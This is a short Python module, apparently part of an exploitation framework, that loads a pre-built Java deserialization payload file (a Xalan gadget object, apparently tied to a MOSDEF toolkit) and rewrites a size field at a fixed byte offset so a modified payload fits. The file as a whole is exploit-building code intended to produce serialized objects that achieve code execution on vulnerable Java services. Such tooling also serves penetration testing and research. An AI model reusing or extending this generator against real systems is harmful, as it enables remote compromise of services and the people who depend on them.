import struct
import os
import ast
import logging

from SerializedObjectCreator import SerializedObjectCreator
from java_payload_modifiers import JavaPayloadModifiers


class objectcreator(SerializedObjectCreator):
     def __init__(self, **kwargs):
        super(objectcreator,self).__init__(**kwargs)
        self.payload_files = {"java.util.Random": os.path.join("deserialization_payloads",
                                                               "xalan_java_mosdef_p4.obj")}
        self.default_payload = "java.util.Random"

     def get_payload(self, call_info=[]):
          SIZE_OFFSET = 0x1d0+12

          payload = super(objectcreator, self).get_payload(self.default_payload)
          bin_original_size = payload[SIZE_OFFSET:SIZE_OFFSET+2]
          original_size = struct.unpack(">H", bin_original_size)[0]
          updated_size = original_size + self.mod_delta

          logging.info("original size:" + str(original_size))
          logging.info("updated_size:" + str(updated_size))

          updated = payload[:SIZE_OFFSET] + struct.pack(">H", updated_size) + payload[SIZE_OFFSET+2:]

          return updated
